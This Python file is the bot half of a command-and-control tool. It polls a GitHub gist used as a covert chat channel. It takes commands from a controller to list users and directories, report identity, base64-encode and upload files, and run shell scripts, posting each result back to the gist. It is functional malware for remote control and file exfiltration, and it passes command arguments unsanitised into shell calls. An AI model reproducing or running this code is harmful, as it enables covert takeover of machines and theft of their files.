import base64
from time import sleep
from subprocess import check_output
from os import path
import sys

sys.path.append('..')
from common.utils import add_message, check_chat_file, get_last_commands, replace_newlines_with_spaces
from common.utils import CONTROLLER_NICK_NAME, BOT_NICK_NAME
from common.gist import pull_gist, init_gist

SLEEP_TIME = 10


def process_who():
    return check_output('w', shell=True).decode('utf-8').strip()


def process_ls(dir_path):
    if path.exists(dir_path):
        return replace_newlines_with_spaces(check_output(f'ls {dir_path}', shell=True).decode('utf-8').strip())
    return ''


def process_id():
    return check_output('id', shell=True).decode('utf-8').strip()


def process_cp(file_path):
    if path.exists(file_path):
        file = open(file_path, 'rb')
        data_binary = file.read()
        return base64.b64encode(data_binary).decode('ascii')
    return ''


def process_exec(file_path):
    if path.exists(file_path):
        return replace_newlines_with_spaces(check_output(f'sh {file_path}', shell=True).decode('utf-8').strip())
    return ''


def process_cmd(sender, msg_id, cmd):
    if len(cmd) == 0 or sender != CONTROLLER_NICK_NAME:
        return

    if cmd == 'w':
        result = process_who()
        print(f'who reply: {result}')
    elif cmd.startswith('ls '):
        result = process_ls(cmd[3:])
        print(f'ls reply: {result}')
    elif cmd == 'id':
        result = process_id()
        print(f'id reply: {cmd}')
    elif cmd.startswith('cp '):
        result = process_cp(cmd[3:])
        print(f'cp reply: {result}')
    elif cmd.startswith('exec '):
        result = process_exec(cmd[5:])
        print(f'exec reply: {result}')
    else:
        print(f'Unknown command: "{cmd}"')
        return
    print(flush=True)

    add_message(result, BOT_NICK_NAME, reply_to=msg_id)


def run():
    print('Bot is starting...')
    init_gist()
    max_msg_id = check_chat_file()
    # TODO - check previous commands?
    print('Bot is running...')

    is_killed = False

    while not is_killed:
        sleep(SLEEP_TIME)
        pull_gist()
        new_max_msg_id = check_chat_file()

        if new_max_msg_id > max_msg_id:
            count = new_max_msg_id - max_msg_id
            print(f'Processing {count} new messages...', flush=True)
            commands = get_last_commands(count)
            for (sender, msg_id, cmd) in commands:
                if cmd == 'kill':
                    print('Killing the bot...')
                    is_killed = True
                    break
                process_cmd(sender, msg_id, cmd)
            max_msg_id = new_max_msg_id
        else:
            print('No new messages...', flush=True)


if __name__ == '__main__':
    run()
